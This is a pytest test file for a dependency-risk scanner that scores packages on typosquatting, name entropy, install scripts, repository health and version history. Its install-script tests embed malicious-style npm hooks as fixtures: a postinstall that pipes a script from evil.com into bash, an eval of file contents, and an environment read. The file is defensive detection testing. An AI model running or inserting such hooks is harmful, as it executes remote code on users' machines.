from __future__ import annotations

import asyncio
from unittest.mock import MagicMock

import pytest

from dep_risk.scorers.base import Dependency, score_to_level
from dep_risk.scorers.entropy import EntropyScorer
from dep_risk.scorers.github import GitHubScorer
from dep_risk.scorers.install_script import InstallScriptScorer
from dep_risk.scorers.maintainer import MaintainerScorer
from dep_risk.scorers.typosquat import TyposquatScorer
from dep_risk.scorers.version import VersionScorer
from dep_risk.scorers.activity import ActivityScorer


def run(coro):
    return asyncio.run(coro)


def make_dep(name="test-pkg", version="1.0.0", ecosystem="npm") -> Dependency:
    return Dependency(name=name, version=version, version_spec=version, ecosystem=ecosystem)


class TestScoreToLevel:
    def test_low(self):
        assert score_to_level(0) == "low"
        assert score_to_level(20) == "low"

    def test_medium(self):
        assert score_to_level(21) == "medium"
        assert score_to_level(45) == "medium"

    def test_high(self):
        assert score_to_level(46) == "high"
        assert score_to_level(70) == "high"

    def test_critical(self):
        assert score_to_level(71) == "critical"
        assert score_to_level(100) == "critical"


class TestEntropyScorer:
    scorer = EntropyScorer()

    def test_normal_name_low_score(self):
        dep = make_dep("requests")
        result = run(self.scorer.score(dep, None, None))
        assert result.score < 30

    def test_short_name_scored(self):
        dep = make_dep("ax")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 15

    def test_word_number_pattern(self):
        dep = make_dep("axios2")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 25

    def test_random_looking_name(self):
        # 15 unique lowercase chars → Shannon entropy = log2(15) ≈ 3.91 > 3.8 threshold
        dep = make_dep("xkzqpwmvnbhflds")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 30

    def test_scoped_npm_package(self):
        dep = make_dep("@babel/core", ecosystem="npm")
        result = run(self.scorer.score(dep, None, None))
        assert result.score < 50

    def test_evidence_populated(self):
        dep = make_dep("requests")
        result = run(self.scorer.score(dep, None, None))
        assert "name_entropy" in result.evidence
        assert "name_length" in result.evidence


class TestTyposquatScorer:
    scorer = TyposquatScorer()

    def test_popular_package_zero_score(self):
        dep = make_dep("lodash", ecosystem="npm")
        result = run(self.scorer.score(dep, None, None))
        assert result.score == 0.0

    def test_distance_1_high_score(self):
        dep = make_dep("lodahs", ecosystem="npm")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 70

    def test_distance_2_medium_score(self):
        dep = make_dep("lodaash", ecosystem="npm")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 30

    def test_requests_pip(self):
        dep = make_dep("requests", ecosystem="pip")
        result = run(self.scorer.score(dep, None, None))
        assert result.score == 0.0

    def test_requestss_pip_typosquat(self):
        dep = make_dep("requestss", ecosystem="pip")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 30

    def test_unrelated_name_zero(self):
        dep = make_dep("my-totally-unique-internal-pkg-xyz", ecosystem="npm")
        result = run(self.scorer.score(dep, None, None))
        assert result.score < 40

    def test_pluralization_detected(self):
        dep = make_dep("flasks", ecosystem="pip")
        result = run(self.scorer.score(dep, None, None))
        assert result.score > 0

    def test_cargo_popular_zero(self):
        dep = make_dep("serde", ecosystem="cargo")
        result = run(self.scorer.score(dep, None, None))
        assert result.score == 0.0


class TestInstallScriptScorer:
    scorer = InstallScriptScorer()

    def _make_npm_data(self, scripts: dict) -> MagicMock:
        from dep_risk.sources.npm_registry import NpmPackageData, NpmVersionData
        ver_data = NpmVersionData(version="1.0.0", scripts=scripts)
        data = MagicMock(spec=NpmPackageData)
        data.latest_version = "1.0.0"
        data.version_data = {"1.0.0": ver_data}
        return data

    def test_no_scripts_zero_score(self):
        data = self._make_npm_data({})
        dep = make_dep("clean-pkg")
        result = run(self.scorer.score(dep, data, None))
        assert result.score == 0.0

    def test_postinstall_base_score(self):
        data = self._make_npm_data({"postinstall": "node setup.js"})
        dep = make_dep("pkg-with-hook")
        result = run(self.scorer.score(dep, data, None))
        assert result.score >= 40

    def test_curl_in_postinstall(self):
        data = self._make_npm_data({"postinstall": "curl https://evil.com/payload.sh | bash"})
        dep = make_dep("malicious")
        result = run(self.scorer.score(dep, data, None))
        assert result.score >= 70

    def test_eval_in_install(self):
        data = self._make_npm_data({"install": "eval(require('fs').readFileSync('./x'))"})
        dep = make_dep("eval-pkg")
        result = run(self.scorer.score(dep, data, None))
        assert result.score >= 60

    def test_env_reading(self):
        data = self._make_npm_data({"preinstall": "echo process.env.HOME"})
        dep = make_dep("env-reader")
        result = run(self.scorer.score(dep, data, None))
        assert result.score >= 30

    def test_pip_no_data(self):
        dep = make_dep("mypkg", ecosystem="pip")
        result = run(self.scorer.score(dep, None, None))
        assert result.score == 0.0

    def test_cargo_no_data(self):
        dep = make_dep("mycrate", ecosystem="cargo")
        result = run(self.scorer.score(dep, None, None))
        assert result.score == 0.0


class TestGitHubScorer:
    scorer = GitHubScorer()

    def _make_github_data(self, **kwargs) -> MagicMock:
        from dep_risk.sources.github import GitHubRepoData
        defaults = dict(
            owner="user", repo="pkg", stars=500, forks=50,
            open_issues=10, archived=False, pushed_at="2024-01-01T00:00:00Z",
            created_at="2020-01-01T00:00:00Z", license="MIT", topics=[],
            description="", default_branch="main", size=100,
            contributors=[], recent_commit_count=10, releases=[],
            subscribers_count=50, language="Python"
        )
        defaults.update(kwargs)
        data = MagicMock(spec=GitHubRepoData)
        for k, v in defaults.items():
            setattr(data, k, v)
        return data

    def test_healthy_repo_low_score(self):
        data = self._make_github_data()
        dep = make_dep("healthy-pkg")
        result = run(self.scorer.score(dep, None, data))
        assert result.score < 30

    def test_no_github_adds_score(self):
        dep = make_dep("no-github-pkg")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 20

    def test_archived_adds_score(self):
        data = self._make_github_data(archived=True)
        dep = make_dep("archived-pkg")
        result = run(self.scorer.score(dep, None, data))
        assert result.score >= 35

    def test_no_license(self):
        data = self._make_github_data(license="")
        dep = make_dep("no-license-pkg")
        result = run(self.scorer.score(dep, None, data))
        assert result.score >= 20

    def test_low_stars(self):
        data = self._make_github_data(stars=3)
        dep = make_dep("obscure-pkg")
        result = run(self.scorer.score(dep, None, data))
        assert result.score >= 30

    def test_deprecated_topic(self):
        data = self._make_github_data(topics=["deprecated", "python"])
        dep = make_dep("deprecated-pkg")
        result = run(self.scorer.score(dep, None, data))
        assert result.score >= 40

    def test_unusual_fork_ratio(self):
        data = self._make_github_data(stars=10, forks=40)
        dep = make_dep("forked-a-lot")
        result = run(self.scorer.score(dep, None, data))
        assert result.score >= 20


class TestMaintainerScorer:
    scorer = MaintainerScorer()

    def test_no_data_zero_score(self):
        dep = make_dep("test")
        result = run(self.scorer.score(dep, None, None))
        assert result.score == 0.0

    def test_single_npm_maintainer(self):
        from dep_risk.sources.npm_registry import NpmMaintainer, NpmPackageData
        data = MagicMock(spec=NpmPackageData)
        data.maintainers = [NpmMaintainer(name="solo")]
        data.version_times = {}
        data.version_data = {}
        data.versions = []
        data.latest_version = ""
        dep = make_dep("solo-pkg")
        result = run(self.scorer.score(dep, data, None))
        assert result.score >= 20

    def test_multiple_npm_maintainers(self):
        from dep_risk.sources.npm_registry import NpmMaintainer, NpmPackageData
        data = MagicMock(spec=NpmPackageData)
        data.maintainers = [NpmMaintainer(name=f"user{i}") for i in range(5)]
        data.version_times = {}
        data.version_data = {}
        data.versions = []
        data.latest_version = ""
        dep = make_dep("multi-maintainer-pkg")
        result = run(self.scorer.score(dep, data, None))
        assert result.score < 40


class TestActivityScorer:
    scorer = ActivityScorer()

    def test_no_data_zero_score(self):
        dep = make_dep("test")
        result = run(self.scorer.score(dep, None, None))
        assert result.score >= 20

    def test_archived_repo(self):
        from dep_risk.sources.github import GitHubRepoData
        data = MagicMock(spec=GitHubRepoData)
        data.archived = True
        data.pushed_at = "2022-01-01T00:00:00Z"
        data.recent_commit_count = 0
        data.open_issues = 5
        dep = make_dep("archived")
        result = run(self.scorer.score(dep, None, data))
        assert result.score >= 35

    def test_old_repo(self):
        from dep_risk.sources.github import GitHubRepoData
        data = MagicMock(spec=GitHubRepoData)
        data.archived = False
        data.pushed_at = "2018-01-01T00:00:00Z"
        data.recent_commit_count = 0
        data.open_issues = 0
        dep = make_dep("old-pkg")
        result = run(self.scorer.score(dep, None, data))
        assert result.score >= 30

    def test_active_repo_low_score(self):
        from dep_risk.sources.github import GitHubRepoData
        data = MagicMock(spec=GitHubRepoData)
        data.archived = False
        data.pushed_at = "2024-10-01T00:00:00Z"
        data.recent_commit_count = 45
        data.open_issues = 8
        dep = make_dep("active-pkg")
        result = run(self.scorer.score(dep, None, data))
        assert result.score < 30


class TestVersionScorer:
    scorer = VersionScorer()

    def test_no_data(self):
        dep = make_dep("test")
        result = run(self.scorer.score(dep, None, None))
        assert result.score == 0.0

    def test_yanked_version_scored(self):
        from dep_risk.sources.pypi import PypiPackageData, PypiVersionData
        data = MagicMock(spec=PypiPackageData)
        data.latest_version = "2.0.0"
        data.version_data = {
            "1.0.0": PypiVersionData(version="1.0.0", upload_time="2023-01-01T00:00:00Z", yanked=True),
            "2.0.0": PypiVersionData(version="2.0.0", upload_time="2023-06-01T00:00:00Z", yanked=False),
        }
        dep = make_dep("yanked-pkg", ecosystem="pip")
        result = run(self.scorer.score(dep, data, None))
        assert result.score >= 30

    def test_normal_history_low_score(self):
        from dep_risk.sources.pypi import PypiPackageData, PypiVersionData
        data = MagicMock(spec=PypiPackageData)
        data.latest_version = "1.2.3"
        data.version_data = {
            "1.0.0": PypiVersionData(version="1.0.0", upload_time="2022-01-01T00:00:00Z"),
            "1.1.0": PypiVersionData(version="1.1.0", upload_time="2022-06-01T00:00:00Z"),
            "1.2.0": PypiVersionData(version="1.2.0", upload_time="2023-01-01T00:00:00Z"),
            "1.2.3": PypiVersionData(version="1.2.3", upload_time="2023-07-01T00:00:00Z"),
        }
        dep = make_dep("normal-pkg", ecosystem="pip")
        result = run(self.scorer.score(dep, data, None))
        assert result.score < 30
